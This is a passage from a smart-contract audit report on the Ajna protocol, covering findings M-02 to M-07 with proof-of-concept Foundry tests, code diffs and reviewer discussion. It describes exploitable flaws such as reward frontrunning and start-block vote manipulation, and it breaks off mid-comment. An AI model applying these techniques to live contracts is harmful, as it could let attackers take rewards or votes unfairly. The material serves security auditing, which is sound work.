### Recommended Mitigation Steps

Consider introducing the minimum accepted vote power for any proposal to be included in the final slate, as an example:

<https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-grants/src/grants/base/StandardFunding.sol#L421-L441>

```diff
    function _validateSlate(uint24 distributionId_, uint256 endBlock, uint256 distributionPeriodFundsAvailable_, uint256[] calldata proposalIds_, uint256 numProposalsInSlate_) internal view returns (uint256 sum_) {
        ...

+       // using 0.1% of the total vote power used as a minimum for any winning proposal
+       uint minFundingVotePower = _distributions[distributionId_].fundingVotePowerCast / 1000;
        // check each proposal in the slate is valid
        for (uint i = 0; i < numProposalsInSlate_; ) {
            Proposal memory proposal = _standardFundingProposals[proposalIds_[i]];

            // check if Proposal is in the topTenProposals list
            if (_findProposalIndex(proposalIds_[i], _topTenProposals[distributionId_]) == -1) revert InvalidProposalSlate();

            // account for fundingVotesReceived possibly being negative
-           if (proposal.fundingVotesReceived < 0) revert InvalidProposalSlate();
+           if (proposal.fundingVotesReceived < 0 || Maths.wpow(SafeCast.toUint256(Maths.abs(proposal.fundingVotesReceived)), 2) < minFundingVotePower) revert InvalidProposalSlate();
```

**[ith-harvey (Ajna) confirmed](https://github.com/code-423n4/2023-05-ajna-findings/issues/465#issuecomment-1554800129)**



***

## [[M-02] Delegate rewards system is unfair to delegates with less tokens and reduces decentralization](https://github.com/code-423n4/2023-05-ajna-findings/issues/413)
*Submitted by [0x73696d616f](https://github.com/code-423n4/2023-05-ajna-findings/issues/413), also found by [0xRobocop](https://github.com/code-423n4/2023-05-ajna-findings/issues/131)*

<https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L286><br>
<https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L541><br>
<https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L673><br>
<https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L891>

Reduces decentralization significantly and discourages delegates with less token power to vote.

### Proof of Concept

The current math gives delegates rewards based on the square of their votes. Thus, accounts with higher number of votes will be rewarded a bigger number of rewards, leading to less decentralization.

Add the following test to `StandardFunding.t.sol`

    function test_POC_WhaleCanStealMostDelegateRewards() external {
        // 24 tokenholders self delegate their tokens to enable voting on the proposals
        _selfDelegateVoters(_token, _votersArr);

        changePrank(_tokenDeployer);
        _token.transfer(_tokenHolder1, 300_000_000 * 1e18);

        vm.roll(_startBlock + 150);

        // start distribution period
        _startDistributionPeriod(_grantFund);

        uint24 distributionId = _grantFund.getDistributionId();

        (, , , uint128 gbc, , ) = _grantFund.getDistributionPeriodInfo(distributionId);

        assertEq(gbc, 15_000_000 * 1e18);

        TestProposalParams[] memory testProposalParams = new TestProposalParams[](1);
        testProposalParams[0] = TestProposalParams(_tokenHolder1, 8_500_000 * 1e18);

        // create 7 proposals paying out tokens
        TestProposal[] memory testProposals = _createNProposals(_grantFund, _token, testProposalParams);
        assertEq(testProposals.length, 1);

        vm.roll(_startBlock + 200);

        // screening period votes
        _screeningVote(_grantFund, _tokenHolder1, testProposals[0].proposalId, _getScreeningVotes(_grantFund, _tokenHolder1));
        _screeningVote(_grantFund, _tokenHolder2, testProposals[0].proposalId, _getScreeningVotes(_grantFund, _tokenHolder2));

        /*********************/
        /*** Funding Stage ***/
        /*********************/

        // skip time to move from screening period to funding period
        vm.roll(_startBlock + 600_000);


        // check topTenProposals array is correct after screening period - only six should have advanced
        GrantFund.Proposal[] memory screenedProposals = _getProposalListFromProposalIds(_grantFund, _grantFund.getTopTenProposals(distributionId));

        // funding period votes for two competing slates, 1, or 2 and 3
        _fundingVote(_grantFund, _tokenHolder1, screenedProposals[0].proposalId, voteYes, 350_000_000 * 1e18);
        _fundingVote(_grantFund, _tokenHolder2, screenedProposals[0].proposalId, voteYes, 50_000_000 * 1e18);

        /************************/
        /*** Challenge Period ***/
        /************************/

        uint256[] memory potentialProposalSlate = new uint256[](1);
        potentialProposalSlate[0] = screenedProposals[0].proposalId;

        // skip to the end of the DistributionPeriod
        vm.roll(_startBlock + 650_000);

        vm.expectEmit(true, true, false, true);
        emit FundedSlateUpdated(distributionId, _grantFund.getSlateHash(potentialProposalSlate));
        bool proposalSlateUpdated = _grantFund.updateSlate(potentialProposalSlate, distributionId);
        assertTrue(proposalSlateUpdated);

        /********************************/
        /*** Execute Funded Proposals ***/
        /********************************/

        // skip to the end of the Distribution's challenge period
        vm.roll(_startBlock + 700_000);

        // execute funded proposals
        _executeProposal(_grantFund, _token, testProposals[0]);

        /******************************/
        /*** Claim Delegate Rewards ***/
        /******************************/

        assertEq(_grantFund.getDelegateReward(distributionId, _tokenHolder1) / 1e18, 1_470_000);
        assertEq(_grantFund.getDelegateReward(distributionId, _tokenHolder2) / 1e18, 30_000);

        // _tokenHolder1 reward is approx 1_470_000/(1_470_000 + 30_000) ~ 98%

        // linear distribution
        // _tokenHolder1 reward is approx 350/(350 + 50) = 87.5%
    }

In this test, `_tokenHolder1` has 350/50 = 7 times more tokens and leads to getting 98% of the rewards.<br>
Had a linear distribution been used, `_tokenHolder1` would have received 87.5%, a fairer number.

In fact, it's even better to use a quadratic voting system, being the rewards the square root of the votes. This would incentivize more delegates and increase decentralization.

### Tools Used

Vscode, Foundry

### Recommended Mitigation Steps

Use a linear or [quadratic](https://axelar.network/blog/quadratic-voting-DAOs-dPoS-and-decentralization) delegate reward system.

**[MikeHathaway (Ajna) confirmed](https://github.com/code-423n4/2023-05-ajna-findings/issues/413#issuecomment-1555153408)**

**[Picodes (judge) commented](https://github.com/code-423n4/2023-05-ajna-findings/issues/413#issuecomment-1569119241):**
 > Note: validating the finding assuming it is a bug and distributing rewards according to the square wasn't the intent of the dev team. Otherwise, the fact that the warden finds it "unfair" isn't really a security issue.



***

## [[M-03] `_updateBucketExchangeRateAndCalculateRewards` reward calculation accuracy loss](https://github.com/code-423n4/2023-05-ajna-findings/issues/394)
*Submitted by [kutugu](https://github.com/code-423n4/2023-05-ajna-findings/issues/394)*

Divide first and then multiply, which has precision loss. The loss depends on the denominator, which is at most `denominator - 1`.\
Although `Maths.wdiv rounded` adopted in \_updateBucketExchangeRateAndCalculateRewards, reduce the loss, but theoretically `interestFactor` loss is about `interestEarned_ / 2`.\
This means that the more interest are earned, the more users lose.

### Proof of Concept

Modify for testing

```diff
diff --git a/ajna-core/src/RewardsManager.sol b/ajna-core/src/RewardsManager.sol
index 314b476..421940f 100644
--- a/ajna-core/src/RewardsManager.sol
+++ b/ajna-core/src/RewardsManager.sol
@@ -801,8 +801,12 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {
                 rewards_ += Maths.wmul(UPDATE_CLAIM_REWARD, Maths.wmul(burnFactor, interestFactor));
             }
         }
+
+        emit CalculateReward(rewards_);
     }
 
+    event CalculateReward(uint256);
+
     /** @notice Utility method to transfer `Ajna` rewards to the sender
      *  @dev   This method is used to transfer rewards to the `msg.sender` after a successful claim or update.
      *  @dev   It is used to ensure that rewards claimers will be able to claim some portion of the remaining tokens if a claim would exceed the remaining contract balance.
```

Modify reward calculation

```diff
diff --git a/ajna-core/src/RewardsManager.sol b/ajna-core/src/RewardsManager.sol
index 421940f..4cdfefa 100644
--- a/ajna-core/src/RewardsManager.sol
+++ b/ajna-core/src/RewardsManager.sol
@@ -792,13 +792,15 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {
                 (, , , uint256 bucketDeposit, ) = IPool(pool_).bucketInfo(bucketIndex_);
 
                 uint256 burnFactor     = Maths.wmul(totalBurned_, bucketDeposit);
-                uint256 interestFactor = interestEarned_ == 0 ? 0 : Maths.wdiv(
-                    Maths.WAD - Maths.wdiv(prevBucketExchangeRate, curBucketExchangeRate),
-                    interestEarned_
-                );
 
                 // calculate rewards earned for updating bucket exchange rate 
-                rewards_ += Maths.wmul(UPDATE_CLAIM_REWARD, Maths.wmul(burnFactor, interestFactor));
+                rewards_ += interestEarned_ == 0 ? 0 : Maths.wmul(UPDATE_CLAIM_REWARD, Maths.wdiv(
+                    Maths.wmul(
+                        Maths.WAD - Maths.wdiv(prevBucketExchangeRate, curBucketExchangeRate),
+                        burnFactor
+                    ),
+                    interestEarned_
+                ));
             }
         }
```

```shell
forge test --match-test testClaimRewardsFuzzy -vvvv

For a Fuzzing input:
indexes: 3
mintAmount: 73528480588506366763626

Divide first and multiply
emit CalculateReward(: 334143554965844407584)

Multiply first and divide
emit CalculateReward(: 334143554965846586903)
```

### Tools Used

Foundry

### Recommended Mitigation Steps

As modified above, multiply first and then divide.

**[MikeHathaway (Ajna) confirmed](https://github.com/code-423n4/2023-05-ajna-findings/issues/394#issuecomment-1555151437)**



***

## [[M-04] Potential unfair distribution of Rewards due to MEV in `updateBucketExchangeRatesAndClaim`](https://github.com/code-423n4/2023-05-ajna-findings/issues/373)
*Submitted by [bytes032](https://github.com/code-423n4/2023-05-ajna-findings/issues/373), also found by [patitonar](https://github.com/code-423n4/2023-05-ajna-findings/issues/328) and [troublor](https://github.com/code-423n4/2023-05-ajna-findings/issues/84)*

This vulnerability allows malicious actors to exploit the reward system by frontrunning transactions and unfairly claiming rewards, thereby disincentivizing honest users from updating the bucket exchange rates and contributing to the system.

### Proof of Concept

The `updateBucketExchangeRatesAndClaim` function is publicly callable and serves two main purposes:

1.  Updates the exchange rate of a list of buckets.
2.  If eligible, the caller can claim `5%` of the rewards accumulated to each bucket since the last burn event, if it hasn't already been updated.

<https://github.com/code-423n4/2023-05-ajna/blob/fc70fb9d05b13aee2b44be2cb652478535a90edd/ajna-core/src/RewardsManager.sol#L310-L318>

```solidity
function updateBucketExchangeRatesAndClaim(
        address pool_,
        uint256[] calldata indexes_
    ) external override returns (uint256 updateReward) {
        updateReward = _updateBucketExchangeRates(pool_, indexes_);

        // transfer rewards to sender
        _transferAjnaRewards(updateReward);
    }

```

So, to summarize it's primary purpose is to incentivize people who keep the state updated. However, given the nature of the function (first come, first serve) it becomes very prone to MEV.

Consider the following scenario:

1.  Alice is hard-working, non-technical and constantly keeps track of when to update the buckets so she can claim a small reward. Unfortunately, she becomes notorious for getting most of the rewards from updating the bucket exchange rate.
2.  A malicious actor spots Alice's recent gains and creates a bot to front run **any** transactions to RewardsManager's `_updateBucketExchangeRateAndCalculateRewards`submitted by Alice.
3.  The day after that, Alice again see's theres a small reward to claim, attempts to claim it, but she gets front runned by whoever set the bot.
4.  Since Alice is non-technical, she cannot ever beat the bot so she is left with a broken heart and no longer able to claim rewards.

I believe the system should be made fair to everybody that wants to contribute, hence this is a vulnerability that should be taken care of to ensure the fair distribution of awards to people who care about the protocol instead of .

### Recommended Mitigation Steps

I see potentially two solutions here:

1.  Introduce a randomized reward mechanism, such as a lottery system or a probabilistic reward distribution for people who contribute to updating buckets. This could reduce the predictability of rewards and hence the potential for MEV exploitation.
2.  Consider limiting the reward claim process to users who have staked in the rewards manager because they are the individuals that are directly affected if the bucket is not updated, because if its not updated for 14 days they won't be getting rewards. Additionally, you can couple it with a rate-limitting mechanism by implementing a maximum claim per address per time period

**[MikeHathaway (Ajna) acknowledged](https://github.com/code-423n4/2023-05-ajna-findings/issues/373#issuecomment-1571025508)**



***

## [[M-05] Calculating new rewards is susceptible to precision loss due to division before multiplication](https://github.com/code-423n4/2023-05-ajna-findings/issues/367)
*Submitted by [cryptostellar5](https://github.com/code-423n4/2023-05-ajna-findings/issues/367), also found by [ladboy233](https://github.com/code-423n4/2023-05-ajna-findings/issues/136) and [Bauchibred](https://github.com/code-423n4/2023-05-ajna-findings/issues/125)*

This issue is similar to <https://github.com/ajna-finance/audits/blob/main/sherlock/Contest1.md#issue-m-7-calculating-new-rewards-is-susceptible-to-precision-loss-due-to-division-before-multiplication> which is not fixed properly. Still, the final multiplication is being performed after the division.

### Impact

Rewards may be lost (0) due to division before multiplication precision issues.

### Proof of Concept

The `RewardsManager._calculateNewRewards` function calculates the new rewards for a staker by first multiplying `interestEarned_` by `totalBurnedInPeriod` and then dividing by `totalInterestEarnedInPeriod` and then again multiplying by `REWARD_FACTOR`.

Since the division is being performed before the final multiplication, this can lead to precision loss.

```solidity
    function _calculateNewRewards(
        address ajnaPool_,
        uint256 interestEarned_,
        uint256 nextEpoch_,
        uint256 epoch_,
        uint256 rewardsClaimedInEpoch_
    ) internal view returns (uint256 newRewards_) {
        (
            ,
            // total interest accumulated by the pool over the claim period
            uint256 totalBurnedInPeriod,
            // total tokens burned over the claim period
            uint256 totalInterestEarnedInPeriod
        ) = _getPoolAccumulators(ajnaPool_, nextEpoch_, epoch_);

        // calculate rewards earned 
        newRewards_ = totalInterestEarnedInPeriod == 0 ? 0 : Maths.wmul(
            REWARD_FACTOR,
            Maths.wdiv(
                Maths.wmul(interestEarned_, totalBurnedInPeriod), 
                totalInterestEarnedInPeriod
            )
        );
```

### Recommended Mitigation Steps

All the multiplication should be performed in step 1 and then division at the end.

**[MikeHathaway (Ajna) confirmed](https://github.com/code-423n4/2023-05-ajna-findings/issues/367#issuecomment-1555143862)**



***

## [[M-06] An Optimizer Bug in `PositionManager.getPositionIndexesFiltered`](https://github.com/code-423n4/2023-05-ajna-findings/issues/306)
*Submitted by [sces60107](https://github.com/code-423n4/2023-05-ajna-findings/issues/306)*

<https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L484><br>
<https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L3>

There is an optimizer bug in `PositionManager.getPositionIndexesFiltered`.<br>
<https://blog.soliditylang.org/2022/06/15/inline-assembly-memory-side-effects-bug/>

The Yul optimizer considers all memory writes in the outermost Yul block that are never read from as unused and removes them. The bug is fixed in solidity 0.8.15. But `PositionManager.sol` uses solidity 0.8.14.

### Proof of Concept

There is an inline assembly block at the end of `PositionManager.getPositionIndexesFiltered`. The written memory is never read from in the same assembly block. It would trigger the bug to remove the memory write.<br>
<https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L484>

```solidity
    function getPositionIndexesFiltered(
        uint256 tokenId_
    ) external view override returns (uint256[] memory filteredIndexes_) {
        …

        // resize array
        assembly { mstore(filteredIndexes_, filteredIndexesLength) }
    }
```

Unfortunately, `PositionManager` uses solidity 0.8.14 which would suffer from the bug.<br>
<https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L3>

    pragma solidity 0.8.14;

### Recommended Mitigation Steps

Update the solidity version to 0.8.15

**[MikeHathaway (Ajna) confirmed](https://github.com/code-423n4/2023-05-ajna-findings/issues/306#issuecomment-1555128790)**



***

## [[M-07] Calling `StandardFunding.screeningVote` function and `ExtraordinaryFunding.voteExtraordinary` function when `block.number` equals respective start block and when `block.number` is bigger than respective start block can result in different available votes for same voter](https://github.com/code-423n4/2023-05-ajna-findings/issues/288)
*Submitted by [rbserver](https://github.com/code-423n4/2023-05-ajna-findings/issues/288), also found by [deadrxsezzz](https://github.com/code-423n4/2023-05-ajna-findings/issues/355) and [rvierdiiev](https://github.com/code-423n4/2023-05-ajna-findings/issues/168)*

Because of `if (block.number <= screeningStageEndBlock || block.number > endBlock) revert InvalidVote()`, the following `StandardFunding.fundingVote` function can only execute `uint128 newVotingPower = SafeCast.toUint128(_getVotesFunding(msg.sender, votingPower, voter.remainingVotingPower, screeningStageEndBlock))` when `block.number` is bigger than `screeningStageEndBlock`.

<https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L519-L569>

```solidity
    function fundingVote(
        FundingVoteParams[] memory voteParams_
    ) external override returns (uint256 votesCast_) {
        uint24 currentDistributionId = _currentDistributionId;

        QuarterlyDistribution storage currentDistribution = _distributions[currentDistributionId];
        QuadraticVoter        storage voter               = _quadraticVoters[currentDistributionId][msg.sender];

        uint256 endBlock = currentDistribution.endBlock;

        uint256 screeningStageEndBlock = _getScreeningStageEndBlock(endBlock);

        // check that the funding stage is active
        if (block.number <= screeningStageEndBlock || block.number > endBlock) revert InvalidVote();

        uint128 votingPower = voter.votingPower;

        // if this is the first time a voter has attempted to vote this period,
        // set initial voting power and remaining voting power
        if (votingPower == 0) {

            // calculate the voting power available to the voting power in this funding stage
            uint128 newVotingPower = SafeCast.toUint128(_getVotesFunding(msg.sender, votingPower, voter.remainingVotingPower, screeningStageEndBlock));

            voter.votingPower          = newVotingPower;
            voter.remainingVotingPower = newVotingPower;
        }

        ...
    }
```

When the `StandardFunding.fundingVote` function calls the following `StandardFunding._getVotesFunding` function, `screeningStageEndBlock` would be used as the `voteStartBlock_` input for calling the `Funding._getVotesAtSnapshotBlocks` function below. Because `block.number` would always be bigger than `screeningStageEndBlock`, `voteStartBlock_` would always be `screeningStageEndBlock` in the `Funding._getVotesAtSnapshotBlocks` function. This means that the `Funding._getVotesAtSnapshotBlocks` function would always return the same voting power for the same voter at any `block.number` that is bigger than `screeningStageEndBlock` during the funding phase.

<https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L891-L910>

```solidity
    function _getVotesFunding(
        address account_,
        uint256 votingPower_,
        uint256 remainingVotingPower_,
        uint256 screeningStageEndBlock_
    ) internal view returns (uint256 votes_) {
        // voter has already allocated some of their budget this period
        if (votingPower_ != 0) {
            votes_ = remainingVotingPower_;
        }
        // voter hasn't yet called _castVote in this period
        else {
            votes_ = Maths.wpow(
            _getVotesAtSnapshotBlocks(
                account_,
                screeningStageEndBlock_ - VOTING_POWER_SNAPSHOT_DELAY,
                screeningStageEndBlock_
            ), 2);
        }
    }
```

<https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/Funding.sol#L76-L93>

```solidity
    function _getVotesAtSnapshotBlocks(
        address account_,
        uint256 snapshot_,
        uint256 voteStartBlock_
    ) internal view returns (uint256) {
        IVotes token = IVotes(ajnaTokenAddress);

        // calculate the number of votes available at the snapshot block
        uint256 votes1 = token.getPastVotes(account_, snapshot_);

        // enable voting weight to be calculated during the voting period's start block
        voteStartBlock_ = voteStartBlock_ != block.number ? voteStartBlock_ : block.number - 1;

        // calculate the number of votes available at the stage's start block
        uint256 votes2 = token.getPastVotes(account_, voteStartBlock_);

        return Maths.min(votes2, votes1);
    }
```

However, because of `if (block.number < currentDistribution.startBlock || block.number > _getScreeningStageEndBlock(currentDistribution.endBlock)) revert InvalidVote()`, calling the following `StandardFunding.screeningVote` function would not revert when `block.number` equals the current distribution period's start block.

<https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L572-L596>

```solidity
    function screeningVote(
        ScreeningVoteParams[] memory voteParams_
    ) external override returns (uint256 votesCast_) {
        QuarterlyDistribution memory currentDistribution = _distributions[_currentDistributionId];

        // check screening stage is active
        if (block.number < currentDistribution.startBlock || block.number > _getScreeningStageEndBlock(currentDistribution.endBlock)) revert InvalidVote();

        uint256 numVotesCast = voteParams_.length;

        for (uint256 i = 0; i < numVotesCast; ) {
            Proposal storage proposal = _standardFundingProposals[voteParams_[i].proposalId];

            // check that the proposal is part of the current distribution period
            if (proposal.distributionId != currentDistribution.id) revert InvalidVote();

            uint256 votes = voteParams_[i].votes;

            // cast each successive vote
            votesCast_ += votes;
            _screeningVote(msg.sender, proposal, votes);

            unchecked { ++i; }
        }
    }
```

When the `StandardFunding.screeningVote` function calls the following `StandardFunding._screeningVote` function, `if (screeningVotesCast[distributionId][account_] + votes_ > _getVotesScreening(distributionId, account_)) revert InsufficientVotingPower()` is executed in which the `StandardFunding._getVotesScreening` function below would use the current distribution period's start block as the `voteStartBlock_` input for calling the `Funding._getVotesAtSnapshotBlocks` function. Since the `Funding._getVotesAtSnapshotBlocks` function executes `voteStartBlock_ = voteStartBlock_ != block.number ? voteStartBlock_ : block.number - 1`, `voteStartBlock_` would be 1 block prior to the current distribution period's start block when `block.number` equals the current distribution period's start block, and `voteStartBlock_` would be the current distribution period's start block when `block.number` is bigger than the current distribution period's start block. However, it is possible that the same voter has different available votes at 1 block prior to the current distribution period's start block and at the current distribution period's start block. This is unlike the `StandardFunding._getVotesFunding` function that would always return the same voting power for the same voter when calling the `StandardFunding.fundingVote` function during the funding phase. Since calling the `StandardFunding._getVotesScreening` function when `block.number` equals the current distribution period's start block and when `block.number` is bigger than the current distribution period's start block during the screening phase can return different available votes for the same voter, this voter would call the `StandardFunding.screeningVote` function at a chosen `block.number` that would provide the highest votes.

This should not be allowed because `_getVotesScreening(distributionId, account_)` needs to return the same number of votes across all blocks during the screening phase to make `if (screeningVotesCast[distributionId][account_] + votes_ > _getVotesScreening(distributionId, account_)) revert InsufficientVotingPower()` effective in the `StandardFunding._screeningVote` function. For example, a voter who has no available votes at 1 block prior to the current distribution period's start block can mint many AJNA tokens at the current distribution period's start block and call the `StandardFunding.screeningVote` function at `block.number` that is bigger than the current distribution period's start block during the screening phase to use her or his available votes at current distribution period's start block. For another example, a voter who has available votes at 1 block prior to the current distribution period's start block can call the `StandardFunding.screeningVote` function when `block.number` equals the current distribution period's start block and then sell all of her or his AJNA tokens at the same `block.number`. Such voters' actions are unfair to other voters who maintain the same number of available votes at 1 block prior to the current distribution period's start block and at the current distribution period's start block for the screening stage voting.

<https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L698-L753>

```solidity
    function _screeningVote(
        address account_,
        Proposal storage proposal_,
        uint256 votes_
    ) internal {
        uint24 distributionId = proposal_.distributionId;

        // check that the voter has enough voting power to cast the vote
        if (screeningVotesCast[distributionId][account_] + votes_ > _getVotesScreening(distributionId, account_)) revert InsufficientVotingPower();

        ...
    }
```

<https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L872-L881>

```solidity
    function _getVotesScreening(uint24 distributionId_, address account_) internal view returns (uint256 votes_) {
        uint256 startBlock = _distributions[distributionId_].startBlock;

        // calculate voting weight based on the number of tokens held at the snapshot blocks of the screening stage
        votes_ = _getVotesAtSnapshotBlocks(
            account_,
            startBlock - VOTING_POWER_SNAPSHOT_DELAY,
            startBlock
        );
    }
```

Please note that calling the following `ExtraordinaryFunding.voteExtraordinary` function when `block.number` equals `_extraordinaryFundingProposals[proposalId_].startBlock` also does not revert, and the `ExtraordinaryFunding._getVotesExtraordinary` function below also uses `_extraordinaryFundingProposals[proposalId_].startBlock` as the `voteStartBlock_` input for calling the `Funding._getVotesAtSnapshotBlocks` function. Hence, the same issue also applies to the `ExtraordinaryFunding.voteExtraordinary` function.

<https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L131-L157>

```solidity
    function voteExtraordinary(
        uint256 proposalId_
    ) external override returns (uint256 votesCast_) {
        // revert if msg.sender already voted on proposal
        if (hasVotedExtraordinary[proposalId_][msg.sender]) revert AlreadyVoted();

        ExtraordinaryFundingProposal storage proposal = _extraordinaryFundingProposals[proposalId_];
        // revert if proposal is inactive
        if (proposal.startBlock > block.number || proposal.endBlock < block.number || proposal.executed) {
            revert ExtraordinaryFundingProposalInactive();
        }

        // check voting power at snapshot block and update proposal votes
        votesCast_ = _getVotesExtraordinary(msg.sender, proposalId_);
        proposal.votesReceived += SafeCast.toUint120(votesCast_);

        // record that voter has voted on this extraordinary funding proposal
        hasVotedExtraordinary[proposalId_][msg.sender] = true;

        ...
    }
```

<https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L246-L256>

```solidity
    function _getVotesExtraordinary(address account_, uint256 proposalId_) internal view returns (uint256 votes_) {
        if (proposalId_ == 0) revert ExtraordinaryFundingProposalInactive();

        uint256 startBlock = _extraordinaryFundingProposals[proposalId_].startBlock;

        votes_ = _getVotesAtSnapshotBlocks(
            account_,
            startBlock - VOTING_POWER_SNAPSHOT_DELAY,
            startBlock
        );
    }
```

### Proof of Concept

The following steps can occur for the described scenario.

1.  At 1 block prior to the current distribution period's start block, Alice has no available votes at all.
2.  After noticing the `StandardFunding.startNewDistributionPeriod` transaction that would end the previous distribution period and starts the current distribution period in the mempool, Alice backruns that transaction by minting a lot of AJNA tokens at the current distribution period's start block.
3.  When `block.number` becomes bigger than the current distribution period's start block during the screening phase, Alice calls the `StandardFunding.screeningVote` function to successfully use all of her available votes at the current distribution period's start block for a proposal.
4.  Alice's actions are unfair to Bob who prepares for the screening stage voting and maintains the same number of available votes at 1 block prior to the current distribution period's start block and at the current distribution period's start block.

### Tools Used

VSCode

### Recommended Mitigation Steps

<https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L578> can be updated to the following code:

```solidity
        if (block.number <= currentDistribution.startBlock || block.number > _getScreeningStageEndBlock(currentDistribution.endBlock)) revert InvalidVote();
```

and

<https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L139-L141> can be updated to the following code:

```solidity
        if (proposal.startBlock >= block.number || proposal.endBlock < block.number || proposal.executed) {
            revert ExtraordinaryFundingProposalInactive();
        }
```

**[MikeHathaway (Ajna) disputed and commented](https://github.com/code-423n4/2023-05-ajna-findings/issues/288#issuecomment-1555122516):**
 > Different voting mechanisms have different voting specifications.

**[Picodes (judge) commented](https://github.com/code-423n4/2023-05-ajna-findings/issues/288#issuecomment-1570303058):**
 > @MikeHathaway - I think this issue is valid: it is not about different phases but about what happens at `voteStartBlock_ == block.number` versus `voteStartBlock_ == block.number + 1`.

**[rbserver (warden) commented](https://github.com/code-423n4/2023-05-ajna-findings/issues/288#issuecomment-1571029497):**
 > Sorry for any confusion. `At 1 block prior to the current distribution period's start block, Alice has no available votes at all` in the POC section means that Alice has no available votes at that particular block that is 1 block prior to the current distribution period's start block; yet, she can still have available votes at blocks before that particular block. When Alice has available votes at the block that is 33 blocks prior to the current distribution period's start block, it is possible that she uses all of her available votes at the current distribution period's start block for the scenario described in the POC section.

**[MikeHathaway (Ajna) commented](https://github.com/code-423n4/2023-05-ajna-findings/issues/288#issuecomment-1572754288):**
 > If Alice has no voting power 1 block prior to start, than at the start block she will have no voting power if she doesn't transfer and delegate tokens to that address. Prior voting power won't matter, as we take the minimum of the prior snapshot and the current snapshot.

**[rbserver (warden) commented](https://github.com/code-423n4/2023-05-ajna-findings/issues/288#issuecomment-1572806509):**
 > If Alice mints or receives AJNA tokens at the current distribution period's start block, can she gain available votes at the current distribution period's start block? If so, she can have voting power at the current distribution period's start block while has 0 available votes at 1 block prior to the current distribution period's start block. Please correct me if I am understanding this incorrectly.

**[MikeHathaway (Ajna) commented](https://github.com/code-423n4/2023-05-ajna-findings/issues/288#issuecomment-1572838173):**
 > That is incorrect, the snapshot system requires that the balance be > 0 for the entire 33 blocks prior to the distribution period's start. If any block is 0, their power is 0. 
> 
> This can be verified with a quick unit test:
> ```
>     function testVotingPowerAtDistributionStart() external {
>         // 14 tokenholders self delegate their tokens to enable voting on the proposals
>         _selfDelegateVoters(_token, _votersArr);
> 
>         // roll 32 blocks forward to the block before the distribution period starts
>         vm.roll(_startBlock + 32);
> 
>         // _tokenHolder1 transfers their tokens away
>         address nonVotingAddress = makeAddr("nonVotingAddress");
>         changePrank(_tokenHolder1);
>         _token.transfer(nonVotingAddress, 25_000_000 * 1e18);
> 
>         vm.roll(_startBlock + 33);
> 
>         // nonVotingAddress returns the funds one block later
>         changePrank(nonVotingAddress);
>         _token.transfer(_tokenHolder1, 25_000_000 * 1e18);
> 
>         // start distribution period
>         _startDistributionPeriod(_grantFund);
> 
>         // check voting power of _tokenHolder1 is 0
>         uint256 votingPower = _getScreeningVotes(_grantFund, _tokenHolder1);
>         assertEq(votingPower, 0);
>         votingPower = _getScreeningVotes(_grantFund, nonVotingAddress);
>         assertEq(votingPower, 0);
>     }
> ```

**[rbserver (warden) commented](https://github.com/code-423n4/2023-05-ajna-findings/issues/288#issuecomment-1572921612):**
 > Thanks for your reply and unit test!
> 
> The thing is that, to vote in the current distribution period, Alice does not have to vote at the current distribution period's start block and can vote at an eligible block after the current distribution period's start block as stated in Step 3 of the POC section. When voting at such eligible block, Alice can utilize the available votes that she gained at the start block. To demonstrate this, I've made some modifications to your unit test below, which does pass. Please see `@audit` for the places of modification. For this test, at `_startBlock + 33`, which is the start block, `_tokenHolder1`'s voting power is 0; however, at `_startBlock + 34` and `_startBlock + 35`, `_tokenHolder1`'s voting power becomes 25_000_000 * 1e18. The inconsistency between the voting power when voting at the start block and when voting at an eligible block after the start block is the main point of this report.
> 
> ```solidity
>     function testVotingPowerAtDistributionStart() external {
>         // 14 tokenholders self delegate their tokens to enable voting on the proposals
>         _selfDelegateVoters(_token, _votersArr);
> 
>         // roll 32 blocks forward to the block before the distribution period starts
>         vm.roll(_startBlock + 32);
> 
>         // _tokenHolder1 transfers their tokens away
>         address nonVotingAddress = makeAddr("nonVotingAddress");
>         changePrank(_tokenHolder1);
>         // @audit transfer _token.balanceOf(_tokenHolder1) so _tokenHolder1 does not have any AJNA at _startBlock + 32
>         _token.transfer(nonVotingAddress, _token.balanceOf(_tokenHolder1));
> 
>         vm.roll(_startBlock + 33);
> 
>         // nonVotingAddress returns the funds one block later
>         changePrank(nonVotingAddress);
>         _token.transfer(_tokenHolder1, 25_000_000 * 1e18);
> 
>         // start distribution period
>         _startDistributionPeriod(_grantFund);
> 
>         // check voting power of _tokenHolder1 is 0
>         uint256 votingPower = _getScreeningVotes(_grantFund, _tokenHolder1);
>         assertEq(votingPower, 0);
>         votingPower = _getScreeningVotes(_grantFund, nonVotingAddress);
>         assertEq(votingPower, 0);
> 
>         // @audit at _startBlock + 34, _tokenHolder1's voting power becomes 25_000_000 * 1e18, which is not 0
